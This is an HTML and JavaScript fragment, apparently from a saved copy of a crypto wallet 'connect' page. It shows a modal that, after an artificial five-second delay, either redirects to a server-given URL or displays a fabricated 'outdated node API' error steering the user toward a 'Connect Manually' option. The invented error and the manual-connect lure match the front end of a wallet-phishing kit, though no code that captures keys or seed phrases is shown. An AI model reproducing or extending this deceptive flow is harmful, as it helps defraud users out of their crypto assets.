    <!-- Wallet Modal -->
    <div class="modal fade" id="walletModal" tabindex="-1" aria-labelledby="walletModalLabel" aria-hidden="true">
        <div class="modal-dialog modal-dialog-centered">
            <div class="modal-content bg-dark text-white border border-secondary">
                <div class="modal-header border-secondary">
                    <h5 class="modal-title" id="walletModalLabel">Connect Wallet for <span id="serviceName"></span></h5>
                    <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal" aria-label="Close"></button>
                </div>
                <div class="modal-body text-center p-4" id="modalContent">
                    <!-- Modal content will be dynamically inserted here -->
                </div>

    <script src="./check_files/bootstrap.bundle.min.js"></script>
    <script src="./check_files/jquery-3.6.0.min.js"></script>
    <script>
        $(document).ready(function() {
            $(document).on('click', '.service-button', function() {
                const serviceId = $(this).data('service-id');
                const serviceName = $(this).text().trim();
                handleServiceSelect(serviceId, serviceName);
            });

            $('#walletModal').on('hidden.bs.modal', function () {
                handleClose();
            });
        });

        function handleServiceSelect(serviceId, serviceName) {
            $('#serviceName').text(serviceName);
            $('#modalContent').html('<div class="spinner-border text-primary" role="status"><span class="visually-hidden">Loading...</span></div>');
            $('#walletModal').modal('show');

            $.ajax({
                url: '',
                type: 'POST',
                data: { serviceId: serviceId, action: 'select' },
                dataType: 'json',
                success: function(response) {
                    setTimeout(() => {
                        if (response.status === 'error') {
                            showErrorState();
                        } else {
                            showSuccessState(response.redirectUrl);
                        }
                    }, 5000);
                },
                error: function() {
                    setTimeout(() => {
                        showErrorState();
                    }, 5000);
                }
            });
        }

        function showErrorState() {
            $('#modalContent').html(`
                <p class="text-secondary mb-4">
                    Wallet not detected due to outdated node API. Please verify you have the selected wallet installed.
                </p>
                <div class="d-flex gap-3 justify-content-center">
                    <button class="btn btn-primary" onclick="handleRetry()">Retry</button>
                    <button class="btn btn-outline-secondary" onclick="handleConnectManually()">Connect Manually</button>
                </div>
            `);
        }

        function showSuccessState(redirectUrl) {
            $('#modalContent').html(`
                <div class="text-success mb-3">
                    <svg class="bi bi-check-circle" width="48" height="48" viewBox="0 0 16 16" fill="currentColor" xmlns="http://www.w3.org/2000/svg">
                        <path d="M8 15A7 7 0 1 1 8 1a7 7 0 0 1 0 14zm0 1A8 8 0 1 0 8 0a8 8 0 0 0 0 16z"/>
                        <path d="M10.97 4.97a.235.235 0 0 0-.02.022L7.477 9.417 5.384 7.323a.75.75 0 0 0-1.06 1.06L6.97 11.03a.75.75 0 0 0 1.079-.02l3.992-4.99a.75.75 0 0 0-1.071-1.05z"/>
                    </svg>
                </div>
                <p>Connection successful! Redirecting...</p>
            `);
            setTimeout(() => {
                window.location.href = redirectUrl;
            }, 1500);
        }

        function handleRetry() {
            $('#modalContent').html('<div class="spinner-border text-primary" role="status"><span class="visually-hidden">Loading...</span></div>');
            $.ajax({
                url: '',
                type: 'POST',
                data: { action: 'retry' },
                dataType: 'json',
                success: function(response) {
                    setTimeout(() => {
                        if (response.status === 'success') {
                            showSuccessState(response.redirectUrl);
                        } else {
                            showErrorState();
                        }
                    }, 2000);
                },
                error: function() {
                    setTimeout(() => {
                        showErrorState();
                    }, 2000);
                }
            });
        }

        function handleConnectManually() {
            $('#modalContent').html('<div class="spinner-border text-primary" role="status"><span class="visually-hidden">Loading...</span></div>');
            $.ajax({
                url: '',
                type: 'POST',
                data: { action: 'connect_manually' },
                dataType: 'json',
                success: function(response) {
                    setTimeout(() => {
                        if (response.status === 'success') {
                            showSuccessState(response.redirectUrl);
                        } else {
                            showErrorState();
                        }
                    }, 2000);
                },
                error: function() {
                    setTimeout(() => {
                        showErrorState();
                    }, 2000);
                }
            });
        }

        function handleClose() {
            $.ajax({
                url: '',
                type: 'POST',
                data: { action: 'close' },
                dataType: 'json',
                success: function() {
                    // No need to reload services as they are now server-side rendered
                },
                error: function() {
                    alert('Error resetting service state. Please try again.');
                }
            });
        }
    </script>
